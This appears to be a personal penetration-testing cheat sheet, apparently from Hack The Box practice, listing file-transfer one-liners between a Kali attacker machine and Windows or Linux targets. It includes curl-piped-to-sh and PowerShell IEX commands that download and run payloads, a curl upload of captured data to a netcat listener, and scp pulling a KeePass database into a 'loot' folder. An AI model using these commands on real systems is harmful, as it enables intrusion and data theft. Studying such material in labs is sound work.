---
title: transfers
aliases: []
tags:
- study-notes
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: transfers.md
related_tools:
- '[[python3]]'
- '[[netcat]]'
- '[[curl]]'
- '[[certutil]]'
- '[[powershell]]'
- '[[scp]]'
- '[[net]]'
related_techniques: []
related_tactics: []
related_services:
- '[[http]]'
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: windows, linux
---

# transfers

## Kali
- host www `python3 -m http.server 8080`
- netcat
    - capture file `nc -nlvp 8000 > cap.linpeas`
- smb
    - `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/dbcyph0n/htb/share/`
- ssh
    - get `scp lnorgaard@10.10.11.227:passcodes.kdbx ~/dbcyph0n/git/htb/machines/keeper/loot/passcodes.kdbx`

## Windows
- get
    - `curl http://$ip:8080/linpeas.sh | sh`
    - `certutil.exe -split -f -urlcache http://$kali/payload.ps1`
    - `powershell -c 'IEX(New-Object Net.WebClient).downloadString("http://$kali/payload.ps1")'`
- send
    - to netcat `curl -F 'attachment=@cap.linpeas' http://10.10.14.14:8000`
- smb
    - to smbserver.py `\10.10.14\\/140\CompData`
    - map network drive with creds `net use \$kail\$sharename /u:$username $password; cd \$kali\$sharename`

## Linux
- `curl -L http://10.10.14.14:8080/linpeas.sh | sh`

